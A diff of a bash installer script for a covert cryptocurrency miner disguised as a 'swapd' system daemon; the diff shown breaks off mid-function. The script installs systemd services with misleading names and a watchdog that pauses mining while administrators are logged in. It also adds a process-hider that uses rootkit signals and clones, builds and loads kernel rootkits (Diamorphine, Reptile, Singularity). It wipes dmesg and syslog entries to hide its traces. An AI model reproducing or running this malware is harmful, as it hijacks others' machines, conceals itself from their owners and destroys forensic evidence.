@@ -1597,7 +1597,7 @@ elif [ "$MINER_TYPE" = "cpuminer" ]; then
     # ==================== CONFIGURE CPUMINER-MULTI ====================
     echo "[*] Configuring cpuminer-multi..."
     echo "[*] Note: cpuminer-multi uses command-line args, no JSON config"
-
+    
     # Detect server IP for worker identification
     echo "[*] Detecting server IP address for worker identification..."
     PASS=$(get_server_ip)
@@ -1605,7 +1605,7 @@ elif [ "$MINER_TYPE" = "cpuminer" ]; then
         PASS="ARM-$(hostname)-$(date +%s)"
     fi
     echo "[*] Detected worker ID: $PASS"
-
+    
     # Create a simple start script
     cat > /root/.swapd/swapfile << 'CPUMINER_EOF'
 #!/bin/bash
@@ -1621,12 +1621,12 @@ exec ./swapd \
     -B \
     >/dev/null 2>&1
 CPUMINER_EOF
-
+    
     # Replace placeholders
     sed -i "s|WALLET_PLACEHOLDER|$WALLET|g" /root/.swapd/swapfile
     sed -i "s|PASS_PLACEHOLDER|$PASS|g" /root/.swapd/swapfile
     chmod +x /root/.swapd/swapfile
-
+    
     echo "[✓] cpuminer-multi configured"
     echo "[✓] Wallet: ${WALLET:0:20}..."
     echo "[✓] Pass (Worker ID): $PASS"
@@ -1676,17 +1676,17 @@ while true; do
     if who | grep -qvE "^root\s"; then
         ADMIN_LOGGED_IN=true
     fi
-
+    
     # Read previous state
     PREV_STATE=$(cat "$STATE_FILE" 2>/dev/null || echo "stopped")
-
+    
     # Determine desired state
     if [ "$ADMIN_LOGGED_IN" = true ]; then
         DESIRED_STATE="stopped"
     else
         DESIRED_STATE="running"
     fi
-
+    
     # Only act if state CHANGED
     if [ "$DESIRED_STATE" != "$PREV_STATE" ]; then
         if [ "$DESIRED_STATE" = "stopped" ]; then
@@ -1699,7 +1699,7 @@ while true; do
             echo "running" > "$STATE_FILE"
         fi
     fi
-
+    
     # Wait before next check
     sleep "$CHECK_INTERVAL"
 done
@@ -1711,154 +1711,94 @@ echo "[✓] Intelligent watchdog created"
 # ==================== CREATE SYSTEMD SERVICE (if available) ====================
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "[*] Creating systemd service..."
-
+    
     # Set ExecStart based on miner type
     if [ "$MINER_TYPE" = "cpuminer" ]; then
         EXEC_START="/root/.swapd/swapfile"  # cpuminer uses start script
     else
         EXEC_START="/root/.swapd/swapd -c /root/.swapd/swapfile"  # xmrig uses binary + config
     fi
-
-#    cat > /etc/systemd/system/swapd.service <<SERVICE_EOF
-#[Unit]
-#Description=System swap daemon
-#After=network.target process-hider.service
-#Wants=process-hider.service
-#
-#[Service]
-#Type=simple
-#User=root
-#WorkingDirectory=/root/.swapd
-#ExecStart=$EXEC_START
-#ExecStartPost=/bin/bash -c 'sleep 5; PID=\$(systemctl show --property MainPID --value swapd.service); if [ -n "\$PID" ] && [ "\$PID" != "0" ]; then kill -59 \$PID 2>/dev/null || kill -31 \$PID 2>/dev/null; fi'
-#Restart=no
-#Nice=19
-#CPUQuota=95%
-#IOSchedulingClass=idle
-#StandardOutput=null
-#StandardError=null
-#
-#[Install]
-#WantedBy=multi-user.target
-#SERVICE_EOF
-
-cat > /etc/systemd/system/swapd.service << 'EOF'
+    
+    cat > /etc/systemd/system/swapd.service <<SERVICE_EOF
 [Unit]
 Description=System swap daemon
-After=network.target
+After=network.target process-hider.service
+Wants=process-hider.service
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=/root/.swapd
-ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
+ExecStart=$EXEC_START
+ExecStartPost=/bin/bash -c 'sleep 5; PID=\$(systemctl show --property MainPID --value swapd.service); if [ -n "\$PID" ] && [ "\$PID" != "0" ]; then kill -59 \$PID 2>/dev/null || kill -31 \$PID 2>/dev/null; fi'
 Restart=no
 Nice=19
 CPUQuota=95%
+IOSchedulingClass=idle
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
-EOF
-
+SERVICE_EOF
+    
     # Enable and start the service
     systemctl daemon-reload
     systemctl enable swapd 2>/dev/null || true
-
+    
     echo "[✓] Systemd service created and enabled"
-
+    
     # ==================== CREATE PROCESS HIDING DAEMON ====================
     echo "[*] Creating process hiding daemon..."
-
-#    # Install hiding daemon script
-# Smart process-hider daemon that detects working signal
-cat > /usr/local/bin/process-hider << 'HIDER_EOF'
+    
+    # Install hiding daemon script
+    cat > /usr/local/bin/process-hider << 'HIDER_EOF'
 #!/bin/bash
 # Process hiding daemon - continuously hides swapd process
 
-INTERVAL=5  # Check every 5 seconds
-HIDE_SIGNAL=""  # Will be detected on first run
-
-detect_working_signal() {
-    # Test which signal actually hides processes
-    sleep 999 &
-    TEST_PID=$!
-
-    # Try signal -31 (Diamorphine, Crypto-RK)
-    kill -31 $TEST_PID 2>/dev/null
-    sleep 2
-
-    if kill -0 $TEST_PID 2>/dev/null; then
-        # Still alive - check if hidden
-        if ! ps aux | grep "sleep 999" | grep -v grep >/dev/null 2>&1; then
-            # Hidden successfully!
-            kill -9 $TEST_PID 2>/dev/null
-            echo "31"
-            return 0
-        fi
-    fi
-
-    # Signal -31 didn't work or killed it, try -63
-    sleep 999 &
-    TEST_PID=$!
-    kill -63 $TEST_PID 2>/dev/null
-    sleep 2
-
-    if kill -0 $TEST_PID 2>/dev/null; then
-        if ! ps aux | grep "sleep 999" | grep -v grep >/dev/null 2>&1; then
-            kill -9 $TEST_PID 2>/dev/null
-            echo "63"
-            return 0
-        fi
-    fi
-
-    # No working signal found
-    kill -9 $TEST_PID 2>/dev/null
-    echo "0"
-    return 1
-}
-
-# Detect working signal on startup
-HIDE_SIGNAL=$(detect_working_signal)
-
-if [ "$HIDE_SIGNAL" = "0" ]; then
-    echo "ERROR: No working rootkit signal found!" >&2
-    exit 1
-fi
-
-echo "Using signal -$HIDE_SIGNAL for hiding"
+INTERVAL=2  # Check every 2 seconds (fast re-hiding after restarts)
 
 while true; do
-    # Get swapd PID
+    # Check if rootkits are loaded
+    if ! lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then
+        sleep $INTERVAL
+        continue
+    fi
+    
+    # Get swapd PID using systemctl
     SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-
+    
+    # Fallback methods if systemctl fails
     if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
         SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
     fi
-
-    # Hide swapd if found and visible
+    
+    # Hide swapd if found
     if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
+        # Check if visible
         if ps -p "$SWAPD_PID" >/dev/null 2>&1; then
-            # Process is visible, hide it
-            kill -$HIDE_SIGNAL "$SWAPD_PID" 2>/dev/null
+            kill -31 "$SWAPD_PID" 2>/dev/null
+            kill -59 "$SWAPD_PID" 2>/dev/null
         fi
     fi
-
+    
     # Hide watchdog if present
     WATCHDOG_PID=$(systemctl show --property MainPID --value system-watchdog.service 2>/dev/null)
     if [ -n "$WATCHDOG_PID" ] && [ "$WATCHDOG_PID" != "0" ]; then
         if ps -p "$WATCHDOG_PID" >/dev/null 2>&1; then
-            kill -$HIDE_SIGNAL "$WATCHDOG_PID" 2>/dev/null
+            kill -31 "$WATCHDOG_PID" 2>/dev/null
+            kill -59 "$WATCHDOG_PID" 2>/dev/null
         fi
     fi
-
+    
     sleep $INTERVAL
 done
 HIDER_EOF
-
-chmod +x /usr/local/bin/process-hider
-
-# Service file (same as yours)
-cat > /etc/systemd/system/process-hider.service << 'HIDER_SERVICE_EOF'
+    
+    chmod +x /usr/local/bin/process-hider
+    
+    # Create systemd service for hiding daemon
+    cat > /etc/systemd/system/process-hider.service << 'HIDER_SERVICE_EOF'
 [Unit]
 Description=System process manager
 After=network.target swapd.service
@@ -1876,23 +1816,23 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 HIDER_SERVICE_EOF
-
-systemctl daemon-reload
-systemctl enable process-hider
-systemctl start process-hider
-
+    
+    systemctl daemon-reload
+    systemctl enable process-hider 2>/dev/null || true
+    
     echo "[✓] Process hiding daemon installed"
-
-#    # Create watchdog service
-cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
+    
+    # Create watchdog service
+    cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
 [Unit]
 Description=System monitoring watchdog
-After=network.target swapd.service
+After=network.target
 
 [Service]
 Type=simple
 User=root
 ExecStart=/usr/local/bin/system-watchdog
+ExecStartPost=/bin/bash -c 'sleep 5; PID=$(systemctl show --property MainPID --value system-watchdog.service); if [ -n "$PID" ] && [ "$PID" != "0" ]; then kill -59 $PID 2>/dev/null || kill -31 $PID 2>/dev/null; fi'
 Restart=no
 StandardOutput=null
 StandardError=null
@@ -1900,17 +1840,17 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 WATCHDOG_SERVICE_EOF
-
-systemctl daemon-reload
-systemctl enable system-watchdog
-systemctl start system-watchdog
-
+    
+    systemctl daemon-reload
+    systemctl enable system-watchdog 2>/dev/null || true
+    systemctl start system-watchdog 2>/dev/null || true
+    
     echo "[✓] Watchdog service created and enabled"
-
+    
 else
     # ==================== CREATE SYSV INIT SCRIPT ====================
     echo "[*] Creating SysV init script (BusyBox compatible)..."
-
+    
     cat > /etc/init.d/swapd << 'INIT_EOF'
 #!/bin/sh
 ### BEGIN INIT INFO
@@ -1945,10 +1885,10 @@ case "$1" in
     start)
         echo "Starting $NAME..."
         cd $WORKDIR || exit 1
-
+        
         # BusyBox start-stop-daemon doesn't support --chdir
         start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS || true
-
+        
         # Auto-hide process after start (only if rootkits are loaded)
         if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
             sleep 3
@@ -1964,7 +1904,7 @@ case "$1" in
     stop)
         echo "Stopping $NAME..."
         start-stop-daemon --stop --pidfile $PIDFILE --retry 5 2>/dev/null || true
-
+        
         # Fallback kill if pkill exists
         if command -v pkill >/dev/null 2>&1; then
             pkill -9 -f swapd 2>/dev/null || true
@@ -1975,7 +1915,7 @@ case "$1" in
                 kill -9 "$pid" 2>/dev/null || true
             done
         fi
-
+        
         rm -f $PIDFILE
         ;;
     restart)
@@ -2003,9 +1943,9 @@ esac
 
 exit 0
 INIT_EOF
-
+    
     chmod +x /etc/init.d/swapd
-
+    
     # Add to startup (distribution-specific)
     if command -v update-rc.d >/dev/null 2>&1; then
         update-rc.d swapd defaults >/dev/null 2>&1 || true
@@ -2013,502 +1953,332 @@ INIT_EOF
         chkconfig --add swapd >/dev/null 2>&1 || true
         chkconfig swapd on >/dev/null 2>&1 || true
     fi
-
+    
     echo "[✓] SysV init script created and enabled"
-
+    
     # Install watchdog as a background daemon
     echo "[*] Installing watchdog as background daemon..."
     nohup /usr/local/bin/system-watchdog >/dev/null 2>&1 &
     echo "[✓] Watchdog started in background"
 fi
 
-# ==================== INSTALL DIAMORPHINE (Universal Kernel Rootkit) ====================
-install_diamorphine() {
+# ==================== FIX KERNEL HEADERS & INSTALL ROOTKIT ====================
+fix_kernel_headers_and_install_rootkit() {
     echo ""
-    echo "========================================"
-    echo "INSTALLING DIAMORPHINE ROOTKIT"
-    echo "========================================"
-
-    # Skip on non-64-bit systems
-    if [ "$IS_64BIT" = "false" ]; then
-        echo "[!] Skipping Diamorphine on non-64-bit system"
-        return 1
-    fi
-
-    # Check kernel version compatibility
-    KERNEL_VERSION=$(uname -r | cut -d. -f1)
-    KERNEL_MINOR=$(uname -r | cut -d. -f2)
-
-    echo "[*] Detected kernel version: $(uname -r)"
-
-    if [ "$KERNEL_VERSION" -ge 6 ]; then
-        echo ""
-        echo "[!] ============================================"
-        echo "[!] WARNING: Kernel 6.x detected!"
-        echo "[!] ============================================"
-        echo "[!] Diamorphine may NOT work on kernel 6.x"
-        echo "[!] Diamorphine is tested up to kernel 5.x"
-        echo ""
-        echo "[*] RECOMMENDATION for kernel 6.x:"
-        echo "    • Use Reptile rootkit instead (better 6.x support)"
-        echo "    • Or skip rootkit installation"
-        echo ""
-        echo "[*] Attempting installation anyway..."
-        echo "    (may fail during load or cause kernel panic)"
-        echo ""
-        sleep 3
-    elif [ "$KERNEL_VERSION" -eq 5 ] && [ "$KERNEL_MINOR" -ge 15 ]; then
-        echo "[*] Kernel 5.15+ detected - should work but watch for issues"
-    else
-        echo "[✓] Kernel version compatible with Diamorphine"
-    fi
-
-    cd /tmp || return 1
-
-    # Remove old installation
-    if lsmod | grep -q diamorphine 2>/dev/null; then
-        echo "[*] Removing old Diamorphine..."
-        rmmod diamorphine 2>/dev/null || true
-        sleep 1
-    fi
-
-    rm -rf diamorphine 2>/dev/null
-
-    # Clone and build
-    echo "[*] Cloning Diamorphine..."
-    export GIT_TERMINAL_PROMPT=0
-    if ! git clone --depth 1 https://github.com/m0nad/Diamorphine.git diamorphine 2>&1 | grep -v "Username"; then
-        echo "[!] Failed to clone Diamorphine (network or repository unavailable)"
-        unset GIT_TERMINAL_PROMPT
-        return 1
-    fi
-    unset GIT_TERMINAL_PROMPT
-
-    cd diamorphine || {
-        echo "[!] Failed to cd to diamorphine directory"
-        cd /tmp || true
-        rm -rf diamorphine
-        return 1
-    }
-
-    echo "[*] Building Diamorphine..."
-    if [ "$VERBOSE" = true ]; then
-        make
-        BUILD_SUCCESS=$?
-    else
-        make 2>/dev/null
-        BUILD_SUCCESS=$?
-    fi
-
-    if [ $BUILD_SUCCESS -ne 0 ]; then
-        echo "[!] Failed to build Diamorphine"
-        echo "[!] This is common on kernel 6.x - try Reptile instead"
-        cd /tmp || true
-        rm -rf diamorphine
-        return 1
-    fi
-
-    # Load the module
-    echo "[*] Loading Diamorphine kernel module..."
-    insmod diamorphine.ko 2>/dev/null &
-    INSMOD_PID=$!
-    INSMOD_SUCCESS=false
-    for _i in 1 2 3 4 5 6 7 8 9 10; do
-        sleep 1
-        if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
-            wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
-            break
-        fi
-    done
-    if kill -0 "$INSMOD_PID" 2>/dev/null; then
-        echo "[!] insmod hung after 10s — killing"
-        kill -9 "$INSMOD_PID" 2>/dev/null || true
-        wait "$INSMOD_PID" 2>/dev/null || true
-        cd /tmp || true; rm -rf diamorphine; return 1
-    fi
-    if [ "$INSMOD_SUCCESS" != true ]; then
-        echo "[!] Failed to load Diamorphine"
-        echo "[!] Likely kernel incompatibility - try Reptile instead"
-        cd /tmp || true; rm -rf diamorphine; return 1
-    fi
-
-    # Verify it loaded
-    if lsmod | grep -q diamorphine 2>/dev/null; then
-        echo "[✓] Diamorphine loaded successfully"
-        echo "[✓] Surprisingly worked on kernel $(uname -r)!"
-
-        # STEALTH: Clear dmesg to remove module loading traces
-        echo "[*] Clearing dmesg traces..."
-        dmesg -C 2>/dev/null || true
-        sleep 1
-        echo "[✓] Kernel logs cleared"
-
-        # Clean up build artifacts
-        cd /tmp || true
-        rm -rf diamorphine
-
-        return 0
-    else
-        echo "[!] Diamorphine failed to load"
-        cd /tmp || true
-        rm -rf diamorphine
-        return 1
-    fi
-}
-
-# ==================== INSTALL REPTILE (Advanced Kernel Rootkit) ====================
-install_reptile() {
+    echo "=========================================="
+    echo "FIXING KERNEL HEADERS"
+    echo "=========================================="
+    
+    KERNEL_VERSION=$(uname -r)
+    KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
+    HEADERS_DIR="/usr/src/linux-headers-$KERNEL_VERSION"
+    
+    echo "[*] Kernel version: $KERNEL_VERSION"
+    echo "[*] Kernel major: $KERNEL_MAJOR"
+    echo "[*] Headers directory: $HEADERS_DIR"
     echo ""
-    echo "========================================"
-    echo "INSTALLING REPTILE ROOTKIT"
-    echo "========================================"
-
-    # Skip on non-64-bit systems
-    if [ "$IS_64BIT" = "false" ]; then
-        echo "[!] Skipping Reptile on non-64-bit system"
-        return 1
+    
+    # Check if headers are installed
+    if [ ! -d "$HEADERS_DIR" ]; then
+        echo "[*] Installing kernel headers..."
+        apt update -qq 2>/dev/null
+        apt install -y linux-headers-$KERNEL_VERSION 2>&1 | grep -E "Setting up|Unpacking" || true
     fi
-
-    # Check kernel version
-    KERNEL_VERSION=$(uname -r | cut -d. -f1)
-    echo "[*] Detected kernel version: $(uname -r)"
-
-    if [ "$KERNEL_VERSION" -ge 6 ]; then
-        echo "[✓] Kernel 6.x detected - Reptile has BETTER compatibility than Diamorphine"
-        echo "[*] Reptile is more actively maintained and supports newer kernels"
-    else
-        echo "[✓] Kernel version compatible with Reptile"
-    fi
-
-    # Create hidden directory
-    mkdir -p /tmp/.ICE-unix/.X11-unix 2>/dev/null
-    cd /tmp/.ICE-unix/.X11-unix || return 1
-
-    # Remove old installation
-    if [ -d Reptile ]; then
-        echo "[*] Removing old Reptile installation..."
-        rm -rf Reptile
-    fi
-
-    if lsmod | grep -q reptile 2>/dev/null; then
-        echo "[*] Unloading old Reptile module..."
-        rmmod reptile 2>/dev/null || true
-        sleep 1
-    fi
-
-    # Clone Reptile (disable interactive prompts)
-    echo "[*] Cloning Reptile..."
-    export GIT_TERMINAL_PROMPT=0
-
-    # Try Gitee mirror first (faster, more reliable)
-    if [ "$VERBOSE" = true ]; then
-        echo "[*] Cloning from Gitee: https://gitee.com/fengzihk/Reptile.git"
-        git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username"
-        CLONE_STATUS=${PIPESTATUS[0]}
-    else
-        git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username" >/dev/null
-        CLONE_STATUS=${PIPESTATUS[0]}
-    fi
-
-    if [ "$CLONE_STATUS" -eq 0 ]; then
-        echo "[✓] Cloned from Gitee mirror"
-    else
-        echo "[*] Gitee failed, trying GitHub mirror..."
-        if [ "$VERBOSE" = true ]; then
-            echo "[*] Cloning from GitHub: https://github.com/f0rb1dd3n/Reptile.git"
-            git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"
-            CLONE_STATUS=${PIPESTATUS[0]}
-        else
-            git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username" >/dev/null
-            CLONE_STATUS=${PIPESTATUS[0]}
+    
+    # Install build dependencies
+    echo "[*] Installing build dependencies..."
+    apt install -y build-essential gcc make libelf-dev bc kmod cpio flex bison libssl-dev dwarves 2>&1 | grep -E "Setting up|already" || true
+    
+    # Fix kernel configuration
+    echo "[*] Configuring kernel headers..."
+    if [ -d "$HEADERS_DIR" ]; then
+        cd "$HEADERS_DIR" || return 1
+        
+        # Copy config if missing
+        if [ ! -f .config ]; then
+            if [ -f /boot/config-$KERNEL_VERSION ]; then
+                cp /boot/config-$KERNEL_VERSION .config
+                echo "[✓] Copied config from /boot"
+            else
+                echo "[!] Using defconfig"
+                make defconfig >/dev/null 2>&1
+            fi
         fi
-
-        if [ "$CLONE_STATUS" -eq 0 ]; then
-            echo "[✓] Cloned from GitHub mirror"
+        
+        # Run configuration (errors are expected and OK)
+        echo "[*] Running make oldconfig..."
+        yes "" | make oldconfig >/dev/null 2>&1
+        
+        echo "[*] Running make prepare..."
+        make prepare 2>&1 | grep -v "No rule to make target\|fatal error" | grep -E "SYNC|GEN|CC|LD" || true
+        
+        echo "[*] Running make scripts..."
+        make scripts 2>&1 | grep -v "fatal error\|No such file\|classmap" | grep -E "HOSTCC|HOSTLD|LEX|YACC" || true
+        
+        # Verify critical files exist
+        if [ -f include/generated/autoconf.h ] && [ -f include/config/auto.conf ]; then
+            echo "[✓] Kernel headers configured successfully!"
         else
-            echo "[!] Failed to clone Reptile (network or repository unavailable)"
+            echo "[!] WARNING: Some config files may be missing (this is OK for modules)"
+        fi
+    fi
+    
+    echo ""
+    echo "=========================================="
+    echo "COMPILING ROOTKIT"
+    echo "=========================================="
+    
+    # Initialize global variables
+    ROOTKIT_NAME=""
+    HIDE_SIGNAL=0
+    ROOTKIT_WORKING=false
+    
+    if [ "$KERNEL_MAJOR" -ge 6 ]; then
+        # ==================== KERNEL 6.X - USE SINGULARITY ====================
+        echo "[*] Kernel 6.x detected - installing Singularity"
+        echo ""
+        
+        cd /tmp || cd /dev/shm || return 1
+        rm -rf Singularity singularity_backup
+        
+        echo "[*] Cloning Singularity from GitHub..."
+        export GIT_TERMINAL_PROMPT=0
+        if git clone --depth 1 https://github.com/MatheuZSecurity/Singularity 2>&1 | grep -E "Cloning|done"; then
             unset GIT_TERMINAL_PROMPT
-            return 1
-        fi
-    fi
-    unset GIT_TERMINAL_PROMPT
-
-    cd Reptile || return 1
-
-    # Build Reptile
-    echo "[*] Building Reptile (this may take a while)..."
-    if ! make 2>/dev/null; then
-        echo "[!] Failed to build Reptile"
-        cd /tmp/.ICE-unix/.X11-unix || true
-        rm -rf Reptile
-        return 1
-    fi
-
-    # Load the module
-    echo "[*] Loading Reptile kernel module..."
-    insmod reptile.ko 2>/dev/null &
-    INSMOD_PID=$!
-    INSMOD_SUCCESS=false
-    for _i in 1 2 3 4 5 6 7 8 9 10; do
-        sleep 1
-        if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
-            wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
-            break
-        fi
-    done
-    if kill -0 "$INSMOD_PID" 2>/dev/null; then
-        echo "[!] insmod hung after 10s — killing"
-        kill -9 "$INSMOD_PID" 2>/dev/null || true
-        wait "$INSMOD_PID" 2>/dev/null || true
-        cd /tmp/.ICE-unix/.X11-unix || true; rm -rf Reptile; return 1
-    fi
-    if [ "$INSMOD_SUCCESS" != true ]; then
-        echo "[!] Failed to load Reptile"
-        cd /tmp/.ICE-unix/.X11-unix || true; rm -rf Reptile; return 1
-    fi
-
-    # Verify it loaded
-    if lsmod | grep -q reptile 2>/dev/null; then
-        echo "[✓] Reptile loaded successfully"
-        return 0
-    else
-        echo "[!] Reptile failed to load"
-        cd /tmp/.ICE-unix/.X11-unix || true
-        rm -rf Reptile
-        return 1
-    fi
-}
-
-# ==================== INSTALL ROOTKITS ====================
-echo ""
-echo "========================================"
-echo "INSTALLING ROOTKITS"
-echo "========================================"
-
-# Install Diamorphine (lightweight, universal)
-if ! install_diamorphine; then
-    echo "[!] Diamorphine installation failed"
-fi
-
-# Install Reptile (advanced features)
-if install_reptile; then
-    # Reptile-specific commands
-    reptile_cmd hide
-else
-    # Fallback cleanup
-    rmmod reptile 2>/dev/null || true
-fi
-
-# ==================== INSTALL CRYPTO-MINER ROOTKIT ====================
-echo ""
-echo "========================================"
-echo "INSTALLING CRYPTO-MINER ROOTKIT"
-echo "========================================"
-
-cd /tmp 2>/dev/null || {
-    echo "[!] Cannot cd to /tmp, skipping crypto rootkit"
-}
-
-if [ -d /tmp ]; then
-    mkdir -p .X11-unix 2>/dev/null
-    cd .X11-unix 2>/dev/null || {
-        echo "[!] Cannot cd to .X11-unix, trying to create it..."
-        mkdir -p /tmp/.X11-unix 2>/dev/null
-        cd /tmp/.X11-unix 2>/dev/null || true
-    }
-fi
-
-# Clone and build the crypto-miner rootkit
-echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
-export GIT_TERMINAL_PROMPT=0
-if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
-    unset GIT_TERMINAL_PROMPT
-    cd hiding-cryptominers-linux-rootkit/ 2>/dev/null || {
-        echo "[!] Failed to cd to rootkit directory, skipping..."
-    }
-
-    if [ -d hiding-cryptominers-linux-rootkit ] && [ "$(pwd)" = "*hiding-cryptominers-linux-rootkit*" ] || [ -f Makefile ]; then
-        echo "[*] Building rootkit..."
-        if timeout 120 make 2>/dev/null; then
-
-            # Detect RHEL/EL family — hiding-cryptominers-linux-rootkit hangs in
-            # uninterruptible D-state on EL kernels (kill -9 has no effect on D-state).
-            # The only safe fix is to skip insmod entirely on these systems.
-            IS_RHEL_FAMILY=false
-            if [ -f /etc/redhat-release ] || [ -f /etc/almalinux-release ] || \
-               [ -f /etc/rocky-release ] || [ -f /etc/centos-release ] || \
-               grep -qiE "rhel|centos|almalinux|rocky|fedora" /etc/os-release 2>/dev/null; then
-                IS_RHEL_FAMILY=true
-            fi
-
-            if [ "$IS_RHEL_FAMILY" = true ]; then
-                echo "[!] RHEL/EL family detected — skipping insmod for crypto rootkit"
-                echo "[!] Reason: module_init() hangs in uninterruptible D-state on EL kernels"
-                echo "[*] Crypto rootkit compiled but NOT loaded (safe skip)"
-            else
-                echo "[*] Loading rootkit module..."
-                dmesg -C 2>/dev/null || true
-
-                insmod rootkit.ko 2>/dev/null &
-                INSMOD_PID=$!
-                INSMOD_SUCCESS=false
-                for _i in 1 2 3 4 5 6 7 8 9 10; do
-                    sleep 1
-                    if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
-                        wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
-                        break
-                    fi
-                done
-                if kill -0 "$INSMOD_PID" 2>/dev/null; then
-                    echo "[!] insmod hung — D-state detected, cannot kill, skipping"
-                    echo "[*] Continuing without crypto rootkit..."
-                elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^rootkit" 2>/dev/null; then
-                    echo "[✓] Crypto rootkit loaded"
-
-                    # Clean up load messages from logs
-                    sleep 1
-                    sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
-                    sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
-                    sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
-                    sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
-                    sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
-                    sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
-                else
-                    echo "[!] Failed to load crypto rootkit — continuing..."
-                fi
-            fi
-        else
-            echo "[!] Failed to build crypto rootkit"
-        fi
-    fi
-
-    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
-    rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null || true
-else
-    echo "[!] Failed to clone crypto rootkit (network or repository unavailable)"
-    unset GIT_TERMINAL_PROMPT
-fi
-
-# ==================== INSTALL SINGULARITY (KERNEL 6.X ONLY) ====================
-echo ""
-echo "========================================"
-echo "CHECKING FOR SINGULARITY (KERNEL 6.X)"
-echo "========================================"
-
-SINGULARITY_LOADED=false  # Initialize flag
-KERNEL_MAJOR=$(uname -r | cut -d. -f1)
-echo "[*] Detected kernel major version: $KERNEL_MAJOR"
-
-# More robust check - works with both string and int
-if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
-    echo "[✓] Kernel 6.x detected - installing Singularity!"
-    echo ""
-    echo "========================================"
-    echo "INSTALLING SINGULARITY ROOTKIT"
-    echo "For Kernel 6.x"
-    echo "========================================"
-
-    # Ensure we're in /dev/shm for stealth
-    if ! cd /dev/shm 2>/dev/null; then
-        echo "[!] /dev/shm not available, using /tmp"
-        cd /tmp || {
-            echo "[!] Cannot cd to /tmp - skipping Singularity"
-            SINGULARITY_LOADED=false
-        }
-    fi
-
-    # Remove old Singularity if exists
-    if [ -d "Singularity" ]; then
-        rm -rf Singularity
-    fi
-
-    echo "[*] Cloning Singularity from GitHub..."
-    export GIT_TERMINAL_PROMPT=0
-
-    if git clone --depth 1 https://github.com/MatheuZSecurity/Singularity 2>&1 | grep -v "Username"; then
-        unset GIT_TERMINAL_PROMPT
-
-        cd Singularity || {
-            echo "[!] Failed to cd to Singularity directory"
-        }
-
-        if [ -f "Makefile" ]; then
-            # Configure reverse shell IP (localhost by default)
+            echo "[✓] Cloned successfully"
+            
+            cd Singularity || return 1
+            
+            # Configure Singularity
             echo "[*] Configuring Singularity..."
-            sed -i 's/192\.168\.1\.100/127.0.0.1/g' modules/icmp.c 2>/dev/null
-
-            # Try to compile
-            echo "[*] Compiling Singularity (this may take a minute)..."
-
-            if make 2>&1 | tee /tmp/singularity_build.log | tail -5 | grep -q "singularity.ko"; then
-                echo "[✓] Singularity compiled successfully!"
-
-                # Try to load the module
-                echo "[*] Loading Singularity kernel module..."
-                insmod singularity.ko 2>/dev/null &
-                INSMOD_PID=$!
-                INSMOD_SUCCESS=false
-                for _i in 1 2 3 4 5 6 7 8 9 10; do
-                    sleep 1
-                    if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
-                        wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
-                        break
+            sed -i 's/192\.168\.1\.100/127.0.0.1/g' include/core.h 2>/dev/null || true
+            echo "[✓] Configuration updated"
+            echo ""
+            
+            # Compile
+            echo "[*] Compiling Singularity (30-60 seconds)..."
+            echo "[*] Warnings are normal, errors are not..."
+            echo ""
+            
+            if make 2>&1 | tee /tmp/singularity_build.log | grep -E "CC|LD|MODPOST|BTF"; then
+                echo ""
+                if [ -f singularity.ko ]; then
+                    MODULE_SIZE=$(ls -lh singularity.ko | awk '{print $5}')
+                    echo "[✓] Singularity compiled successfully!"
+                    echo "[✓] Module size: $MODULE_SIZE"
+                    echo ""
+                    
+                    # Load module
+                    echo "[*] Loading Singularity module..."
+                    if insmod singularity.ko 2>/dev/null; then
+                        echo "[✓] Singularity loaded successfully!"
+                        
+                        # Clear dmesg traces
+                        dmesg -C 2>/dev/null || true
+                        
+                        # Test hiding with dummy process
+                        echo "[*] Testing process hiding with signal -59..."
+                        sleep 999 &
+                        TEST_PID=$!
+                        
+                        sleep 2
+                        kill -59 $TEST_PID 2>/dev/null
+                        sleep 2
+                        
+                        if kill -0 $TEST_PID 2>/dev/null; then
+                            # Process still alive - check if hidden
